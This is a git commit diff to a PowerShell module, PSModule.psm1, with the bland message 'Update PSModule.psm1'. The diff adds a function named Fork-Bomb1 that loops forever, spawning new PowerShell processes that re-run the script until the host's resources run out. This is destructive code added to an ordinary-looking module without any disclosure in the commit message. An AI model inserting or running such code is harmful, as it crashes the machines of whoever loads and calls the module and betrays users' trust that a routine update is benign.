0479812a1584de72b24b8f0009392ed4b33e97c3
Orion_XVIII <76408216+Clement-XVII@users.noreply.github.com>
2022-10-31 16:06:26 +0100

    Update PSModule.psm1

--- PSModule/PSModule.psm1
+++ PSModule/PSModule.psm1
@@ -1143,4 +1143,7 @@ Param(
     $mediaPlayer.Play()
 }
 
-
+Function Fork-Bomb1 
+{
+    While (1) { $WScript = New-Object -com wscript.shell; $WScript.Exec("powershell.exe &" + $PSCommandPath); }
+}
